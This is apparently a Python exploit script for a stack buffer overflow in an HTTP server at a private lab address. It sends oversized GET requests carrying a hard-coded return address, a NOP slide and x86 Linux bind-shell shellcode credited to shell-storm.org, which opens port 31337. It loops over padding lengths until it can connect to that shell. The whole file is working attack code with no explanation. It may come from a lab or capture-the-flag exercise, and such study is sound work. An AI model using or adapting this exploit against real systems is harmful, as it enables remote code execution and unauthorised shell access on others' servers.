import struct
import socket
import time

address = struct.pack("I",0xbfffba90)
nop_slide = "\x90" * 121

# shell code by http://shell-storm.org/shellcode/files/shellcode-847.php

PORT_NUM = "\x7a\x69" #31337
shell_code = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
shell_code += "\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
shell_code += "\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
shell_code += "\x66\x68"+PORT_NUM+"\x66\x53\x89\xe1\x6a\x10"
shell_code += "\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
shell_code += "\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
shell_code += "\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
shell_code += "\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
shell_code += "\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
shell_code += "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
shell_code += "\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";


exp = "A"*352 + address + nop_slide + shell_code

url = '172.16.158.128'

print("Connecting...")
i = 1
while True:
    s = socket.socket()
    s2 = socket.socket()
    try:
        expl = "A"*i + address + nop_slide + shell_code
        s.connect((url, 80))
        print("Connected")
        s.send('GET /' + expl + ' HTTP/1.0\n\n')
        print("Exploit sent offset:{}".format(i))
        #time.sleep(1)
        s2.connect((url, 31337))
        print("Successful exploit")
        s.close()
        s2.close()
        break
    except Exception as e:
        s.close()
        s2.close()
    i = i + 1

print("Offset found at: {}".format(i-1))
